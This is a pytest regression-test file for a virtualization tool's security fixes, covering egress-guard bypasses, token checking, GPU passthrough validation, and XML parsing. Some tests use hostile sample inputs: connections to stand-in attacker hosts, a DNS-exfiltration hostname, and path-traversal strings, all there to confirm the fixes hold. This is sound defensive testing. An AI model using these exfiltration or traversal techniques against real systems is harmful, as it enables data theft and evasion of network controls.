"""Regression tests for the v2.9 security-audit fixes.

Each test pins a specific vulnerability that was found and fixed, so a future
edit that reintroduces it fails CI instead of shipping.
"""

from __future__ import annotations

import importlib

import pytest


def _imp(name):
    try:
        return importlib.import_module(name)
    except Exception as exc:  # pragma: no cover - environment dependent
        pytest.skip(f"{name} not importable: {exc}")


# ── Egress guard: three bypasses ────────────────────────────────────────────
def _enforce(monkeypatch, allow=""):
    eg = _imp("egress_guard")
    monkeypatch.setenv("OXWARE_EGRESS_MODE", "enforce")
    monkeypatch.setenv("OXWARE_EGRESS_ALLOW", allow)
    monkeypatch.setenv("OXWARE_EGRESS_AUDIT", "0")
    eg._load_policy()
    return eg


def test_connect_with_hostname_is_not_fail_open(monkeypatch):
    """connect(("evil.tld", 443)) used to be allowed: the address is not an IP,
    so the policy returned "non-ip" -> allow, and libc resolved the name behind
    the patched getaddrinfo."""
    eg = _enforce(monkeypatch)
    with pytest.raises(OSError):
        eg._check_sockaddr(("evil.example.com", 443))


def test_hostname_allowlist_still_reachable_by_name(monkeypatch):
    """The bypass fix must not break legitimate allowlisted hostnames."""
    eg = _enforce(monkeypatch, allow="example.com")
    # Should not raise: name is allowlisted (resolution may or may not succeed
    # offline; either way the guard must not reject it outright).
    try:
        eg._check_sockaddr(("example.com", 443))
    except OSError as exc:  # pragma: no cover - only on a blocking resolver
        pytest.fail(f"allowlisted host rejected: {exc}")


def test_dns_not_queried_for_non_allowlisted_name(monkeypatch):
    """A DNS lookup must not be emitted before the deny decision, otherwise
    `<secret>.attacker.tld` is an exfil channel even in enforce mode."""
    eg = _enforce(monkeypatch)
    called = []
    monkeypatch.setattr(eg, "_orig_getaddrinfo",
                        lambda *a, **k: called.append(a) or [])
    with pytest.raises(Exception):
        eg._guarded_getaddrinfo("secret-data.attacker.tld", 443)
    assert not called, "resolver was called for a non-allowlisted hostname"


def test_all_resolved_addresses_are_cached(monkeypatch):
    """Only results[0] used to be cached, so connecting via a later address of a
    multi-homed allowlisted host lost the hostname hint and got blocked."""
    eg = _enforce(monkeypatch, allow="example.com")
    fake = [
        (2, 1, 6, "", ("93.184.216.34", 443)),
        (23, 1, 6, "", ("2606:2800:220:1:248:1893:25c8:1946", 443)),
    ]
    eg._cache_hostnames(fake, "example.com")
    for entry in fake:
        assert eg._resolved.get(entry[4][0]) == "example.com"


# ── Setup token gate ────────────────────────────────────────────────────────
def test_setup_token_rejects_non_ascii_without_crashing(tmp_path, monkeypatch):
    """secrets.compare_digest raises TypeError on non-ASCII str input; the
    endpoint returned 500 instead of 403."""
    cred = _imp("credentials")
    token_file = tmp_path / "setup-token"
    token_file.write_text("realtoken")
    monkeypatch.setattr(cred, "SETUP_TOKEN_FILE", str(token_file), raising=False)
    assert cred.verify_setup_token("ü") is False
    assert cred.verify_setup_token("realtoken") is True


# ── GPU passthrough: device-destruction guard ───────────────────────────────
def test_bind_vfio_rejects_non_gpu_and_traversal(monkeypatch):
    """bind_vfio only checked that the sysfs path existed, so any PCI address
    (SATA controller, management NIC) could be torn off the host."""
    gp = _imp("gpu_passthrough")
    monkeypatch.setattr(gp, "list_passthrough_gpus", lambda: [
        {"pci": "0000:65:00.0", "audio_companion": "0000:65:00.1"}
    ])
    # A real device that is NOT a GPU
    r = gp.bind_vfio("0000:00:17.0")
    assert r["ok"] is False
    # Path traversal / malformed
    for bad in ("../../../../etc/oxware", "0000:65:00.0/../x", "", "nonsense"):
        assert gp.bind_vfio(bad)["ok"] is False
    # The real GPU passes the guard (it fails later for other reasons off-host,
    # but must not be rejected by _assert_is_gpu)
    assert gp._assert_is_gpu("0000:65:00.0") is None
    assert gp._assert_is_gpu("0000:65:00.1") is None      # audio companion


def test_pci_addr_xml_is_fullmatch():
    gp = _imp("gpu_passthrough")
    assert gp._pci_addr_xml("0000:65:00.0")["bus"] == "0x65"
    for bad in ("0000:65:00.0junk", "0000:65:00.0/../x", "zz:zz:zz.z"):
        with pytest.raises(ValueError):
            gp._pci_addr_xml(bad)


# ── ISO library: unbounded mirror index ─────────────────────────────────────
def test_mirror_index_is_clamped(monkeypatch, tmp_path):
    """An unbounded index built a range() of billions of ints (OOM kill) and
    raised IndexError outside the try, wedging the job in 'downloading'."""
    il = _imp("iso_library")
    monkeypatch.setenv("OXWARE_ISO_DIR", str(tmp_path))
    started = {}
    monkeypatch.setattr(il.threading, "Thread",
                        lambda target, args, daemon: type(
                            "T", (), {"start": lambda self: started.update(idx=args[1])})())
    il.download("debian-12-netinst", 2_000_000_000)
    n_mirrors = len(next(e for e in il.CATALOG if e["id"] == "debian-12-netinst")["mirrors"])
    assert 0 <= started["idx"] < n_mirrors


# ── instant clone: libvirt XML parsing ──────────────────────────────────────
def test_disk_parse_handles_modern_libvirt_and_skips_cdrom():
    """libvirt >= 5.10 emits <source file='...' index='N'/>; the old regex
    matched nothing, so cloning failed on Debian 12 / Ubuntu 22+."""
    ic = _imp("instant_clone")
    xml = """<domain><devices>
    <disk type='file' device='disk'><source file='/img/vm.qcow2' index='2'/></disk>
    <disk type='file' device='cdrom'><source file='/iso/u.iso' index='1'/><readonly/></disk>
    </devices></domain>"""
    assert ic._disk_paths_from_xml(xml) == ["/img/vm.qcow2"]
